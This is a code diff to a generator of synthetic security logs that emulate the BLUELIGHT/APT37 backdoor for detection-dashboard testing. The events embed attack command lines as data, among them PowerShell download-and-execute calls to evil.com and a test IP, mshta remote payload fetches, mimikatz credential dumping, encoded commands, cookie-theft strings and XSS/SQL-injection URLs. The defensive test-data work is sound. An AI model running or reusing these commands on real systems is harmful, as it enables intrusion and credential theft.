@@ -21,6 +21,7 @@ import json
 import ntpath
 import os
 import random
+import re
 import sys
 import uuid
 import argparse
@@ -29,6 +30,7 @@ from pathlib import Path
 
 sys.path.insert(0, os.path.dirname(os.path.abspath(__file__)))
 from oci_config import COMPARTMENT_ID
+from test_data_manifest import rebuild_manifest
 
 PROJECT_DIR = Path(__file__).parent.parent
 OUTPUT_DIR = PROJECT_DIR / 'test_data'
@@ -53,6 +55,7 @@ WINDOWS_HOSTS = ["DC01.corp.local", "SRV01.corp.local", "WS01.corp.local"]
 WINDOWS_USERS = ["CORP\\admin", "CORP\\analyst", "NT AUTHORITY\\SYSTEM"]
 
 BASE_TIME = datetime.now(timezone.utc) - timedelta(hours=24)
+ISO_UTC_RE = re.compile(r"^\d{4}-\d{2}-\d{2}T\d{2}:\d{2}:\d{2}(?:\.\d+)?Z$")
 
 
 def ts(offset_minutes=0):
@@ -64,6 +67,37 @@ def ts(offset_minutes=0):
 def windows_guid():
     """Generate a Windows-style GUID string with braces."""
     return "{" + str(uuid.uuid4()).upper() + "}"
+
+
+def shift_iso8601_utc(value, delta):
+    """Shift a ``...Z`` UTC timestamp string by ``delta`` if it matches ISO8601."""
+    if not isinstance(value, str) or not ISO_UTC_RE.match(value):
+        return value
+
+    shifted = datetime.fromisoformat(value.replace("Z", "+00:00")) + delta
+    return shifted.strftime("%Y-%m-%dT%H:%M:%S.%f")[:-3] + "Z"
+
+
+def shift_event_window(payload, delta):
+    """Recursively shift UTC timestamp strings in a JSON-like payload."""
+    if isinstance(payload, dict):
+        return {key: shift_event_window(value, delta) for key, value in payload.items()}
+    if isinstance(payload, list):
+        return [shift_event_window(item, delta) for item in payload]
+    return shift_iso8601_utc(payload, delta)
+
+
+def expand_events_over_days(events, days):
+    """Replicate a scenario set across trailing daily windows ending on the base day."""
+    if days <= 1:
+        return list(events)
+
+    expanded = []
+    for day in range(days - 1, -1, -1):
+        delta = timedelta(days=-day)
+        for event in events:
+            expanded.append(shift_event_window(event, delta))
+    return expanded
 
 
 # ═══════════════════════════════════════════════════════════════════
@@ -1354,6 +1388,31 @@ def generate_windows_events():
                 offset=i*3+j,
             ))
 
+    bluelight_sequences = [
+        (
+            "C:\\Windows\\System32\\cmd.exe",
+            "cmd.exe /c powershell.exe -NoProfile -Command Get-WmiObject Win32_ComputerSystem",
+            "C:\\Program Files\\Internet Explorer\\iexplore.exe",
+            180,
+        ),
+        (
+            "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe",
+            "powershell.exe -NoProfile -Command [Convert]::FromBase64String('QQBDAFQA')",
+            "C:\\Program Files\\Internet Explorer\\iexplore.exe",
+            181,
+        ),
+    ]
+    for image, command_line, parent_image, offset in bluelight_sequences:
+        events.append(sysmon_event(
+            event_id=1,
+            image=image,
+            command_line=command_line,
+            parent_image=parent_image,
+            host="WS01.sevenkingdoms.local",
+            user="joffrey",
+            offset=offset,
+        ))
+
     # ── Certutil Download/Decode (new rule) ──
     certutil_cmds = [
         "certutil -urlcache -split -f http://malware.example.com/payload.exe C:\\Temp\\payload.exe",
@@ -2126,7 +2185,8 @@ SEVEN_KINGDOMS_LINUX = [
 
 
 def winsec_event(event_id, user=None, host=None, source_addr=None,
-                 logon_type=None, process_name=None, msg=None, offset=0):
+                 logon_type=None, process_name=None, command_line=None,
+                 msg=None, offset=0):
     """Generate a Windows Security Event Log JSON entry.
 
     Uses OCI Log Analytics field names for query compatibility.
@@ -2146,6 +2206,7 @@ def winsec_event(event_id, user=None, host=None, source_addr=None,
         "Logon Type": str(logon_type) if logon_type else "",
         "New Process Name": process_name or "",
         "Process Name": process_name or "",
+        "Command Line": command_line or "",
         # Native fields
         "EventID": str(event_id),
         "TimeCreated": ts(offset),
@@ -2156,6 +2217,7 @@ def winsec_event(event_id, user=None, host=None, source_addr=None,
         "SourceAddress": source_addr,
         "LogonType": str(logon_type) if logon_type else "",
         "ProcessName": process_name or "",
+        "CommandLine": command_line or "",
         "msg": msg or f"Windows Security Event {event_id}",
     }
 
@@ -2243,18 +2305,53 @@ def generate_windows_event_security():
         ))
 
     # ── Event 4688: Process Creation ──
-    procs = [
-        "C:\\Windows\\System32\\cmd.exe",
-        "C:\\Windows\\System32\\powershell.exe",
-        "C:\\Windows\\System32\\net.exe",
-        "C:\\Windows\\System32\\whoami.exe",
+    process_scenarios = [
+        ("C:\\Windows\\System32\\cmd.exe", "cmd.exe /c whoami /all"),
+        ("C:\\Windows\\System32\\cmd.exe", "cmd.exe /c schtasks /create /sc minute /mo 5 /tn EvilTask /tr C:\\Temp\\payload.exe"),
+        ("C:\\Windows\\System32\\powershell.exe", "powershell.exe -c Invoke-WebRequest -Uri http://evil.com/payload.exe -OutFile C:\\Temp\\payload.exe"),
+        ("C:\\Windows\\System32\\powershell.exe", "powershell.exe -enc SQBFAFgAIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIABOAGUAdAA="),
+        ("C:\\Temp\\mimikatz.exe", "mimikatz.exe privilege::debug sekurlsa::logonpasswords exit"),
+        ("C:\\Windows\\System32\\powershell.exe", "powershell.exe Invoke-BloodHound -CollectionMethod All"),
     ]
-    for i, proc in enumerate(procs):
+    for i, (proc, command_line) in enumerate(process_scenarios):
         events.append(winsec_event(
             4688, user=random.choice(THREAT_ACTORS),
             process_name=proc,
-            msg=f"A new process has been created: {proc}",
+            command_line=command_line,
+            msg=f"A new process has been created: {command_line}",
             offset=500+i,
+        ))
+
+    bluelight_obfuscated = [
+        ("C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe",
+         "powershell.exe -NoProfile -Command [Convert]::FromBase64String('SQBuAHYAbwBrAGUALQBNAGkAbQBpAGsA')"),
+        ("C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe",
+         "powershell.exe -EncodedCommand JABjAGwAaQBlAG4AdAAgAD0AIABOAGUAdwAtAE8AYgBqAGUAYwB0AA=="),
+        ("C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe",
+         "powershell.exe -encodedcommand SQBuAHYAbwBrAGUALQBXAGUAYgBSAGUAcQ"),
+        ("C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe",
+         "powershell.exe -Command [System.Convert]::ToBase64String([System.Text.Encoding]::UTF8.GetBytes('payload'))"),
+        ("C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe",
+         "powershell.exe -Command $key=0xCF; $b=[byte[]](1..10); ($b | ForEach-Object { $_ -bxor $key })"),
+        ("C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe",
+         "powershell.exe -Command iex(New-Object Net.WebClient).DownloadString('http://203.0.113.10/p.ps1')"),
+        ("C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe",
+         "powershell.exe -Command Invoke-Expression (Get-Content C:\\Users\\Public\\stage.ps1 -Raw)"),
+        ("C:\\Windows\\System32\\wscript.exe",
+         "wscript.exe C:\\Users\\Public\\loader.vbs char(72) char(101) char(108) XOR 0xCF"),
+        ("C:\\Windows\\System32\\mshta.exe",
+         "mshta.exe javascript:eval(unescape('%76%61%72%20%62%3D%22%4F%22'))"),
+        ("C:\\Windows\\System32\\cscript.exe",
+         "cscript.exe //e:vbs C:\\Users\\Public\\dropper.vbs FromBase64String"),
+    ]
+    for i, (proc, command_line) in enumerate(bluelight_obfuscated):
+        events.append(winsec_event(
+            4688, user="joffrey",
+            host="WS01.sevenkingdoms.local",
+            process_name=proc,
+            command_line=command_line,
+            msg="BLUELIGHT obfuscated script execution",
+            offset=520 + i,
         ))
 
     # ── Event 4946/4947: Firewall Rule Changes ──
@@ -2601,6 +2698,7 @@ def sysmon_op_event(event_id, host=None, user=None, source_image=None,
                     dest_hostname=None, dest_ip=None, dest_port=None,
                     query_name=None, query_results=None,
                     pipe_name=None, target_filename=None,
+                    target_object=None, parent_image=None,
                     granted_access=None, msg=None, offset=0):
     """Generate a Windows Sysmon Operational Log JSON entry.
 
@@ -2618,7 +2716,7 @@ def sysmon_op_event(event_id, host=None, user=None, source_image=None,
         "Source Process": source_image or "",
         "Target Process": target_image or "",
         "Process Name": source_image or target_image or "",
-        "Parent Process Name": source_image or "",
+        "Parent Process Name": parent_image or source_image or "",
         "Command Line": command_line or "",
         "Destination Hostname": dest_hostname or "",
         "Destination IP": dest_ip or "",
@@ -2628,7 +2726,7 @@ def sysmon_op_event(event_id, host=None, user=None, source_image=None,
         "Query Results": query_results or "",
         "Pipe Name": pipe_name or "",
         "Target Filename": target_filename or "",
-        "Target Object": "",
+        "Target Object": target_object or "",
         "Granted Access": granted_access or "",
         # Sysmon-native fields (for raw reference)
         "EndpointOS": "Windows",
@@ -2648,9 +2746,213 @@ def sysmon_op_event(event_id, host=None, user=None, source_image=None,
         "QueryResults": query_results or "",
         "PipeName": pipe_name or "",
         "TargetFilename": target_filename or "",
+        "TargetObject": target_object or "",
+        "ParentImage": parent_image or source_image or "",
         "GrantedAccess": granted_access or "",
         "msg": msg or f"Sysmon Event {event_id}",
     }
+
+
+def _bluelight_kill_chain_sysmon_op_events():
+    """Emit BLUELIGHT (S0657 / APT37) IOCs covering every per-widget detection.
+
+    Volexity research: https://www.volexity.com/blog/2021/08/17/north-korean-bluelight-special/
+    Each block targets a specific detection rule under queries/bluelight_*.json so
+    that all dashboard widgets return rows when this dataset is ingested.
+    """
+    events = []
+    apt_host = "WS01.sevenkingdoms.local"
+    apt_user = "joffrey"
+    apt_image = "C:\\Users\\Public\\bluelight.exe"
+    iexplore = "C:\\Program Files\\Internet Explorer\\iexplore.exe"
+    powershell = "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe"
+    cmd = "C:\\Windows\\System32\\cmd.exe"
+    rundll32 = "C:\\Windows\\System32\\rundll32.exe"
+
+    base = 1000
+
+    file_discovery_cmds = [
+        ("dir /s /b C:\\Users\\joffrey\\Documents", iexplore, cmd),
+        ("dir /s C:\\Users\\joffrey\\Desktop\\*.docx", iexplore, cmd),
+        ("powershell -Command Get-ChildItem -Recurse -Path C:\\Users -Filter *.pdf",
+         iexplore, powershell),
+        ("tree C:\\Users\\joffrey /F", "C:\\Windows\\System32\\wscript.exe", cmd),
+    ]
+    for i, (cl, parent, image) in enumerate(file_discovery_cmds):
+        events.append(sysmon_op_event(
+            1,
+            host=apt_host, user=apt_user,
+            source_image=image, parent_image=parent,
+            command_line=cl,
+            msg="BLUELIGHT: file discovery from browser child",
+            offset=base + i,
+        ))
+
+    sec_paths = [
+        "HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Uninstall",
+        "HKLM\\SYSTEM\\CurrentControlSet\\Services\\WinDefend",
+        "HKLM\\SOFTWARE\\Microsoft\\Security Center\\SecurityCenter2",
+        "HKLM\\SOFTWARE\\Windows Defender\\Exclusions",
+        "HKLM\\SOFTWARE\\AVAST Software\\Avast",
+        "HKLM\\SOFTWARE\\ESET\\ESET Security",
+        "HKLM\\SOFTWARE\\KasperskyLab\\AVP",
+    ]
+    for i, target in enumerate(sec_paths):
+        events.append(sysmon_op_event(
+            12 + (i % 3),
+            host=apt_host, user=apt_user,
+            source_image=apt_image, parent_image=apt_image,
+            target_object=target,
+            msg="BLUELIGHT: registry enumeration of security products",
+            offset=base + 50 + i,
+        ))
+
+    yara_pdb_cmds = [
+        "C:\\Development\\BACKDOOR\\ncov\\Release\\bluelight.pdb",
+        "powershell -Command Get-Content C:\\Users\\Public\\Release\\bluelight.pdb",
+    ]
+    for i, cl in enumerate(yara_pdb_cmds):
+        events.append(sysmon_op_event(
+            1,
+            host=apt_host, user=apt_user,
+            source_image=apt_image, parent_image=cmd,
+            command_line=cl,
+            msg="BLUELIGHT YARA: PDB path indicator",
+            offset=base + 100 + i,
+        ))
+    events.append(sysmon_op_event(
+        11,
+        host=apt_host, user=apt_user,
+        source_image=apt_image, parent_image=apt_image,
+        target_filename="C:\\Users\\Public\\BACKDOOR\\ncov\\bluelight.pdb",
+        msg="BLUELIGHT YARA: PDB file write",
+        offset=base + 110,
+    ))
+
+    yara_recon_cmds = [
+        'curl https://ipinfo.io/json',
+        'powershell -Command Invoke-WebRequest -Uri https://ipinfo.io',
+        'cmd /c echo {"UserName":"joffrey","ComName":"WS01","OnlineIP":"203.0.113.10","LocalIP":"10.0.1.10","AntiVirus":"Windows Defender","Process Level":"Medium","VM":"false"}',
+    ]
+    for i, cl in enumerate(yara_recon_cmds):
+        events.append(sysmon_op_event(
+            1,
+            host=apt_host, user=apt_user,
+            source_image=apt_image if i == 2 else powershell,
+            parent_image=apt_image,
+            command_line=cl,
+            msg="BLUELIGHT YARA: system reconnaissance JSON",
+            offset=base + 130 + i,
+        ))
+
+    yara_cookie_cmds = [
+        'powershell -Command "cookie_name: OSID, cookie_name: SID, __Secure-3PSID"',
+        'cmd /c echo cookie_name: __Secure-3PSID',
+        'powershell -Command "Failed to get chrome cookie"',
+        'powershell -Command "Failed to get Edge cookie database"',
+        'cmd /c echo GM_ACTION_TOKEN=abc GM_ID_KEY=xyz',
+        'cmd /c echo mail/u/0/?ik=abc Success to enable imap',
+        'cmd /c echo Success to enable thunder access',
+    ]
+    for i, cl in enumerate(yara_cookie_cmds):
+        events.append(sysmon_op_event(
+            1,
+            host=apt_host, user=apt_user,
+            source_image=apt_image, parent_image=apt_image,
+            command_line=cl,
+            msg="BLUELIGHT YARA: chrome/edge cookie theft",
+            offset=base + 150 + i,
+        ))
+
+    keylog_files = [
+        ("C:\\Users\\joffrey\\AppData\\Local\\Temp\\cheV01.dat", "BLUELIGHT YARA: keylog cheV01"),
+        ("C:\\Users\\joffrey\\AppData\\Local\\Temp\\INTEG.RAW", "BLUELIGHT YARA: keylog INTEG.RAW"),
+        ("C:\\Users\\joffrey\\AppData\\Local\\Temp\\keylog.dat", "BLUELIGHT YARA: keylog dat"),
+        ("C:\\Users\\joffrey\\AppData\\Local\\Temp\\keylog.log", "BLUELIGHT YARA: keylog log"),
+        ("C:\\Users\\joffrey\\AppData\\Local\\Temp\\edb.chk", "BLUELIGHT YARA: edb.chk"),
+        ("C:\\Users\\joffrey\\AppData\\Local\\Temp\\edb.log", "BLUELIGHT YARA: edb.log"),
+        ("C:\\Users\\joffrey\\AppData\\Local\\Temp\\edbres00001.jrs", "BLUELIGHT YARA: edbres jrs"),
+        ("C:\\Users\\joffrey\\AppData\\Local\\Temp\\edbres00002.jrs", "BLUELIGHT YARA: edbres jrs"),
+        ("C:\\Users\\joffrey\\AppData\\Local\\Temp\\edbtmp.log", "BLUELIGHT YARA: edbtmp.log"),
+    ]
+    for i, (path, msg) in enumerate(keylog_files):
+        events.append(sysmon_op_event(
+            11,
+            host=apt_host, user=apt_user,
+            source_image=apt_image, parent_image=apt_image,
+            target_filename=path,
+            msg=msg,
+            offset=base + 200 + i,
+        ))
+
+    yara_google_cmds = [
+        'cmd /c echo Accept-Language: ko-KR,ko;q=0.8,en-US;q=0.5',
+        'cmd /c echo User-Agent: Mozilla/5.0 (Windows NT 10.0; rv:80.0) Gecko/20100101 Firefox/80.0',
+        'cmd /c echo AccountSettingsUi/data/batchexecute SNlM0e BqLdsd token',
+    ]
+    for i, cl in enumerate(yara_google_cmds):
+        events.append(sysmon_op_event(
+            1,
+            host=apt_host, user=apt_user,
+            source_image=apt_image, parent_image=apt_image,
+            command_line=cl,
+            msg="BLUELIGHT YARA: Google App C2 indicator",
+            offset=base + 230 + i,
+        ))
+
+    ingress_files = [
+        "C:\\Users\\joffrey\\AppData\\Local\\Temp\\stage2.exe",
+        "C:\\Users\\joffrey\\AppData\\Local\\Temp\\loader.dll",
+        "C:\\Users\\Public\\AppData\\Roaming\\update.scr",
+        "C:\\Users\\joffrey\\AppData\\Local\\Temp\\runner.bat",
+        "C:\\Users\\joffrey\\AppData\\Local\\Temp\\stager.ps1",
+    ]
+    for i, path in enumerate(ingress_files):
+        events.append(sysmon_op_event(
+            11,
+            host=apt_host, user=apt_user,
+            source_image=apt_image, parent_image=apt_image,
+            target_filename=path,
+            msg=f"BLUELIGHT: ingress tool transfer ({path.split(chr(92))[-1]})",
+            offset=base + 260 + i,
+        ))
+
+    wmi_cmds = [
+        "powershell -Command Get-WmiObject -Class Win32_ComputerSystem",
+        "powershell -Command Get-CimInstance -ClassName Win32_OperatingSystem",
+        "wmic.exe path Win32_Processor get Name",
+        "wmic.exe path Win32_NetworkAdapterConfiguration get IPAddress",
+    ]
+    for i, cl in enumerate(wmi_cmds):
+        events.append(sysmon_op_event(
+            1,
+            host=apt_host, user=apt_user,
+            source_image=powershell if "powershell" in cl else "C:\\Windows\\System32\\wbem\\wmic.exe",
+            parent_image=iexplore,
+            command_line=cl,
+            msg="BLUELIGHT: WMI system enumeration from browser child",
+            offset=base + 300 + i,
+        ))
+
+    child_proc_set = [
+        ("cmd.exe /c whoami", cmd),
+        ("powershell.exe -NoProfile -Command Get-Process", powershell),
+        ("wscript.exe C:\\Users\\Public\\loader.vbs", "C:\\Windows\\System32\\wscript.exe"),
+        ("mshta.exe http://203.0.113.20/payload.hta", "C:\\Windows\\System32\\mshta.exe"),
+        ("cscript.exe //e:vbs C:\\Users\\Public\\dropper.vbs", "C:\\Windows\\System32\\cscript.exe"),
+        ("rundll32.exe C:\\Users\\Public\\stage.dll,RunMain", rundll32),
+    ]
+    for i, (cl, image) in enumerate(child_proc_set):
+        events.append(sysmon_op_event(
+            1,
+            host=apt_host, user=apt_user,
+            source_image=image, parent_image=iexplore,
+            command_line=cl,
+            msg="BLUELIGHT: browser spawning suspicious child process",
+            offset=base + 330 + i,
+        ))
+
+    return events
 
 
 def generate_sysmon_operational():
@@ -2785,6 +3087,36 @@ def generate_sysmon_operational():
             msg=f"File created: payload_{i}.exe",
             offset=520+i,
         ))
+
+    # BLUELIGHT-style periodic screenshot staging.
+    for i in range(8):
+        events.append(sysmon_op_event(
+            11,
+            source_image="C:\\Users\\Public\\bluelight.exe",
+            target_filename=f"C:\\Users\\joffrey\\AppData\\Local\\Temp\\capture_{i}.jpg",
+            user="joffrey",
+            msg=f"File created: capture_{i}.jpg",
+            offset=530,
+        ))
+
+    for i, browser in enumerate([
+        "C:\\Program Files\\Google\\Chrome\\Application\\chrome.exe",
+        "C:\\Program Files\\Mozilla Firefox\\firefox.exe",
+        "C:\\Program Files (x86)\\Microsoft\\Edge\\Application\\msedge.exe",
+        "C:\\Program Files\\Internet Explorer\\iexplore.exe",
+    ]):
+        events.append(sysmon_op_event(
+            10,
+            host="WS01.sevenkingdoms.local",
+            user="joffrey",
+            source_image="C:\\Users\\Public\\bluelight.exe",
+            target_image=browser,
+            granted_access="0x1fffff",
+            msg=f"BLUELIGHT browser credential access: {ntpath.basename(browser)}",
+            offset=545 + i,
+        ))
+
+    events.extend(_bluelight_kill_chain_sysmon_op_events())
 
     # ── Event 17: Named Pipe Creation (C2 indicator) ──
     pipes = [
@@ -2985,6 +3317,75 @@ def generate_sysmon_network_events():
                 msg=f"C2 beacon: {proc.split(chr(92))[-1]} -> HTTPS",
                 offset=100 + i * 6 + j,
             ))
+
+    # BLUELIGHT-style drive-by compromise: iexplore.exe reaching non-Microsoft hosts.
+    drive_by_hosts = [
+        ("jquery.services", "203.0.113.45"),
+        ("malicious-news.example.com", "198.51.100.20"),
+        ("watering-hole.attacker.top", "203.0.113.99"),
+        ("compromised-cdn.bad.example", "198.51.100.55"),
+    ]
+    for i, (host, ip) in enumerate(drive_by_hosts):
+        for j in range(3):
+            events.append(sysmon_network_event(
+                host="WS01.sevenkingdoms.local", user="joffrey",
+                image="C:\\Program Files\\Internet Explorer\\iexplore.exe",
+                dst_ip=ip, dst_port=443, dst_hostname=host,
+                technique_name="Drive-by Compromise", technique_id="T1189",
+                msg=f"BLUELIGHT drive-by: iexplore -> {host}",
+                offset=120 + i * 4 + j,
+            ))
+
+    # BLUELIGHT YARA Google App C2: non-browser process reaching Google services.
+    google_c2_hosts = ["mail.google.com", "myaccount.google.com"]
+    google_procs = [
+        "C:\\Users\\Public\\bluelight.exe",
+        "C:\\Windows\\System32\\rundll32.exe",
+    ]
+    for i, proc in enumerate(google_procs):
+        for j, host in enumerate(google_c2_hosts):
+            events.append(sysmon_network_event(
+                host="WS01.sevenkingdoms.local", user="joffrey",
+                image=proc, dst_ip="142.250.80.46", dst_port=443,
+                dst_hostname=host,
+                technique_name="Application Layer Protocol",
+                technique_id="T1071.001",
+                msg=f"BLUELIGHT YARA: Google App C2 from {proc.split(chr(92))[-1]}",
+                offset=135 + i * 2 + j,
+            ))
+
+    # BLUELIGHT-style Microsoft Graph / cloud storage C2 traffic.
+    graph_procs = [
+        "C:\\Users\\Public\\bluelight.exe",
+        "C:\\Windows\\System32\\rundll32.exe",
+        "C:\\Windows\\System32\\powershell.exe",
+    ]
+    for i, proc in enumerate(graph_procs):
+        for j in range(4):
+            events.append(sysmon_network_event(
+                image=proc,
+                dst_ip=random.choice(c2_ips),
+                dst_port=443,
+                dst_hostname=random.choice(["graph.microsoft.com", "login.microsoftonline.com"]),
+                technique_name="Application Layer Protocol",
+                technique_id="T1071.001",
+                msg=f"Cloud API beacon: {proc.split(chr(92))[-1]} -> Microsoft Graph",
+                offset=145 + i * 5 + j,
+            ))
+
+    for i in range(4):
+        events.append(sysmon_network_event(
+            host="WS01.sevenkingdoms.local",
+            user="joffrey",
+            image="C:\\Users\\Public\\bluelight.exe",
+            dst_ip=random.choice(c2_ips),
+            dst_port=443,
+            dst_hostname="graph.microsoft.com",
+            technique_name="Application Layer Protocol",
+            technique_id="T1071.001",
+            msg="BLUELIGHT Graph API exfiltration",
+            offset=162 + i,
+        ))
 
     # ── DNS Tunneling: port 53 from suspicious processes ──
     for i in range(8):
@@ -3197,6 +3598,73 @@ def webapp_event(attack_type, owasp_category, url, http_method="GET",
     }
 
 
+def application_event(service_name, message="Request completed", level="INFO",
+                      url="/", http_method="GET", status_code="200",
+                      response_time_ms=150, client_ip=None, user_agent=None,
+                      user=None, trace_id=None, session_id=None,
+                      span_name=None, span_attributes="", attack_type=None,
+                      attack_severity=None, waf_score=None, db_target=None,
+                      error_type=None, slow_request=False, orders_sync_created=0,
+                      orders_sync_updated=0, orders_sync_failed=0,
+                      orders_sync_source=None, referrer="https://app.example.com/",
+                      response_headers="Content-Type: application/json; X-Frame-Options: DENY",
+                      content_type="application/json", hostname=None, offset=0):
+    """Generate application/browser telemetry shaped for the SOC app dashboards."""
+    if client_ip is None:
+        client_ip = random.choice(CORPORATE_IPS)
+    if user_agent is None:
+        user_agent = random.choice([
+            "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36",
+            "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15",
+            "Mozilla/5.0 (X11; Linux x86_64; rv:124.0) Gecko/20100101 Firefox/124.0",
+        ])
+    if user is None:
+        user = random.choice(["cersei", "jaime", "tyrion", "arya", "sansa", "jon"])
+    if trace_id is None:
+        trace_id = f"trace_{uuid.uuid4().hex[:16]}"
+    if session_id is None:
+        session_id = f"sess_{uuid.uuid4().hex[:12]}"
+    if span_name is None:
+        span_name = f"HTTP {http_method} {url.split('?', 1)[0]}"
+    if hostname is None:
+        hostname = "crm-portal-01" if service_name == "enterprise-crm-portal" else "drone-shop-01"
+
+    return {
+        "timestamp": ts(offset),
+        "serviceName": service_name,
+        "traceId": trace_id,
+        "httpMethod": http_method,
+        "requestUrl": url,
+        "uriPath": url.split("?", 1)[0],
+        "queryString": url.split("?", 1)[1] if "?" in url else "",
+        "statusCode": str(status_code),
+        "responseTimeMs": response_time_ms,
+        "clientAddress": client_ip,
+        "userAgent": user_agent,
+        "user": user,
+        "sessionId": session_id,
+        "requestId": f"req_{uuid.uuid4().hex[:8]}",
+        "contentType": content_type,
+        "referrer": referrer,
+        "responseHeaders": response_headers,
+        "spanName": span_name,
+        "spanAttributes": span_attributes,
+        "securityAttackType": attack_type,
+        "securityAttackSeverity": attack_severity,
+        "wafScore": waf_score,
+        "dbTarget": db_target,
+        "errorType": error_type,
+        "slowRequest": "true" if slow_request else "false",
+        "ordersSyncCreated": orders_sync_created,
+        "ordersSyncUpdated": orders_sync_updated,
+        "ordersSyncFailed": orders_sync_failed,
+        "ordersSyncSource": orders_sync_source,
+        "level": level,
+        "hostname": hostname,
+        "message": message,
+    }
+
+
 def generate_waf_events():
     """Generate WAF security events for all OWASP attack types."""
     events = []
@@ -3329,6 +3797,8 @@ def generate_lb_access_events():
         "/backup", "/db", "/debug", "/console", "/swagger",
         "/api-docs", "/actuator/health", "/graphql", "/server-status",
         "/robots.txt", "/sitemap.xml", "/composer.json", "/Dockerfile",
+        "/jenkins", "/solr/admin", "/hudson", "/boaform/admin", "/manager/html",
+        "/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php",
     ]
     for i, path in enumerate(scanner_paths):
         events.append(lb_access_event("GET", path, 404,
@@ -3462,8 +3932,274 @@ def generate_webapp_events():
     return events
 
 
+def generate_application_events():
+    """Generate application and browser telemetry for App 360 and browser dashboards."""
+    events = []
+
+    browser_ip = "185.220.101.1"
+    brute_force_ip = "194.5.249.7"
+    hijack_ip = "23.129.64.100"
+
+    # Service lifecycle and baseline traffic
+    events.extend([
+        application_event("enterprise-crm-portal", message="enterprise-crm-portal started",
+                          level="INFO", url="/health", response_time_ms=30, offset=0),
+        application_event("octo-drone-shop", message="octo-drone-shop started",
+                          level="INFO", url="/health", response_time_ms=25, offset=1),
+        application_event("enterprise-crm-portal", message="Request completed",
+                          url="/crm/dashboard", response_time_ms=142, offset=2),
+        application_event("enterprise-crm-portal", message="Request completed",
+                          url="/crm/orders/42", response_time_ms=188, offset=3),
+        application_event("octo-drone-shop", message="Request completed",
+                          url="/shop/products/7", response_time_ms=96, offset=4),
+        application_event("octo-drone-shop", message="Request completed",
+                          url="/shop/cart", response_time_ms=120, offset=5),
+    ])
+
+    # Cross-service trace correlation + order sync workflow
+    for idx, (created, updated, failed) in enumerate([(12, 4, 0), (8, 2, 1), (15, 3, 0)]):
+        shared_trace = f"trace_order_sync_{idx:02d}"
+        base_offset = 10 + idx * 3
+        events.append(application_event(
+            "octo-drone-shop",
+            message="Request completed",
+            url=f"/shop/api/orders/sync?batch={idx}",
+            http_method="POST",
+            response_time_ms=640 + idx * 75,
+            trace_id=shared_trace,
+            db_target="oracle_atp",
+            orders_sync_source="octo-drone-shop",
+            offset=base_offset,
+        ))
+        events.append(application_event(
+            "enterprise-crm-portal",
+            message="External orders sync completed",
+            url="/crm/api/integrations/orders/sync",
+            http_method="POST",
+            response_time_ms=980 + idx * 40,
+            trace_id=shared_trace,
+            db_target="oracle_atp",
+            orders_sync_created=created,
+            orders_sync_updated=updated,
+            orders_sync_failed=failed,
+            orders_sync_source="octo-drone-shop",
+            offset=base_offset + 1,
+        ))
+        events.append(application_event(
+            "enterprise-crm-portal",
+            message="Request completed",
+            url="/crm/api/integrations/orders/sync",
+            http_method="POST",
+            response_time_ms=720 + idx * 60,
+            trace_id=shared_trace,
+            db_target="oracle_atp",
+            slow_request=True,
+            offset=base_offset + 2,
+        ))
+
+    # Error and slow request telemetry
+    events.extend([
+        application_event("enterprise-crm-portal", message="Unhandled exception in checkout flow",
+                          level="ERROR", url="/crm/checkout", status_code="500",
+                          response_time_ms=2430, trace_id="trace_error_001",
+                          error_type="DatabaseTimeoutError", db_target="oracle_atp",
+                          slow_request=True, offset=30),
+        application_event("enterprise-crm-portal", message="Unhandled exception in profile save",
+                          level="ERROR", url="/crm/profile", status_code="500",
+                          response_time_ms=2120, trace_id="trace_error_002",
+                          error_type="ValidationError", slow_request=True, offset=31),
+        application_event("octo-drone-shop", message="Unhandled exception in payment workflow",
+                          level="ERROR", url="/shop/checkout/payment", status_code="502",
+                          response_time_ms=2860, trace_id="trace_error_003",
+                          error_type="UpstreamGatewayError", db_target="oracle-atp",
+                          slow_request=True, offset=32),
+        application_event("octo-drone-shop", message="Request completed",
+                          url="/shop/search?q=drone", response_time_ms=2085,
+                          db_target="oracle_atp", slow_request=True, offset=33),
+        application_event("enterprise-crm-portal", message="enterprise-crm-portal shutting down",
+                          level="INFO", url="/health", response_time_ms=20, offset=34),
+        application_event("octo-drone-shop", message="octo-drone-shop shutting down",
+                          level="INFO", url="/health", response_time_ms=20, offset=35),
+    ])
+
+    # Browser / OWASP attack telemetry from a single multi-vector attacker
+    attack_specs = [
+        {
+            "url": "/crm/search?q=%3Cscript%3Ealert(1)%3C/script%3E",
+            "attack_type": "xss_reflected",
+            "severity": "high",
+            "span_attributes": "document.cookie document.write",
+            "content_type": "text/html",
+            "headers": "Content-Type: text/html",
+            "service": "enterprise-crm-portal",
+        },
+        {
+            "url": "/shop/products?name=%3Cimg%20src=x%20onerror=alert(document.cookie)%3E",
+            "attack_type": "xss_dom",
+            "severity": "critical",
+            "span_attributes": "document.cookie .innerHTML insertAdjacentHTML",
+            "content_type": "text/html",
+            "headers": "Content-Type: text/html",
+            "service": "octo-drone-shop",
+        },
+        {
+            "url": "/crm/search?q=1'%20OR%201=1--",
+            "attack_type": "sqli",
+            "severity": "critical",
+            "span_attributes": "sql injection detector",
+            "service": "enterprise-crm-portal",
+        },
+        {
+            "url": "/shop/api/orders?sort=UNION%20SELECT%20username,password%20FROM%20users",
+            "attack_type": "sqli",
+            "severity": "critical",
+            "span_attributes": "orm query exception",
+            "service": "octo-drone-shop",
+        },
+        {
+            "url": "/crm/checkout?miner=coinhive",
+            "attack_type": "browser_malware",
+            "severity": "high",
+            "span_attributes": "keydown keypress keyup addEventListener payment checkout",
+            "service": "enterprise-crm-portal",
+        },
+        {
+            "url": "/shop/profile?payload=javascript:alert(1)",
+            "attack_type": "xss_reflected",
+            "severity": "high",
+            "span_attributes": "eval( Function( location.hash",
